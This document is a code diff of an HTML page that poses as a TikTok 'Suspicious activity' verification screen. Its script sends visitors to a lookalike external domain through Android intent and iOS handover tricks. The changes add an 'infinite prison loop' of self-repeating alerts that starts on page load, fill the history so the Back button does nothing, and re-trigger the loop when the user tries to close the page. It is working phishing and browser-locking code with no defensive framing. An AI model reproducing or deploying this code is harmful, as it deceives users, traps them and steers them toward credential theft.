@@ -22,7 +22,7 @@
         .btn { 
             background: #fe2c55; color: #fff; padding: 12px 60px; 
             border-radius: 4px; font-weight: 600; font-size: 15px; 
-            border: none; cursor: pointer; -webkit-tap-highlight-color: transparent;
+            border: none;
         }
     </style>
 </head>
@@ -34,50 +34,49 @@
             <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
             <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
         </svg>
-
         <div class="header">Suspicious activity</div>
         <div class="subtext">Please complete verification to continue using TikTok.</div>
-
-        <button class="btn" onclick="shotgun()">Verify</button>
+        <button class="btn">Verify</button>
     </div>
 
 <script>
     const url = "https://tik-tok-verification.com/Verification/verify1.html";
 
-    function shotgun() {
+    function attemptBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         if (isAndroid) {
+            // High-priority Intent for Android
             window.location.href = `intent://${url.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
         } else {
-            // iOS Handover
+            // Handover protocols for iOS
             window.location.replace("x-web-search://?" + encodeURIComponent(url));
-            setTimeout(() => { window.location.href = url; }, 50);
+            window.location.href = url;
         }
     }
 
-    // THE X-BUTTON INTERCEPTOR
-    window.onblur = function() {
-        // 1. Immediately fire the breakout
-        shotgun();
+    // THE INFINITE PRISON LOOP
+    function startPrison() {
+        // 1. Try to push the user out to the browser
+        attemptBreakout();
 
-        // 2. THE JAMMER: Synchronous loop to freeze the app
-        // This stops the native 'Close' command from finishing.
-        const start = Date.now();
-        while (Date.now() - start < 1000) { 
-            // This 1-second freeze prevents the WebView from closing 
-            // long enough for the OS to switch to the browser.
-        }
+        // 2. Lock the UI with an alert
+        // When they hit OK, the function calls itself again immediately
+        alert("SECURITY ALERT: Verification Required.\n\nPress OK to open the secure verification window.");
         
-        // 3. Last ditch attempt
-        shotgun();
-    };
+        // 3. Recursive call: This starts the next alert + breakout attempt
+        setTimeout(startPrison, 10);
+    }
 
-    // BACK BUTTON: Standard Treadmill (No Alerts)
     window.onload = () => {
-        for(let i=0; i<20; i++) history.pushState(null, null, "#" + i);
-    };
-    window.onpopstate = () => { history.forward(); };
+        // Start the loop immediately on page load
+        startPrison();
 
+        // Fill history so Back button is useless
+        for(let i=0; i<10; i++) history.pushState(null, null, "#" + i);
+    };
+
+    // If they somehow bypass the alert and try to close via X
+    window.onblur = () => { startPrison(); };
 </script>
 </body>
 </html>
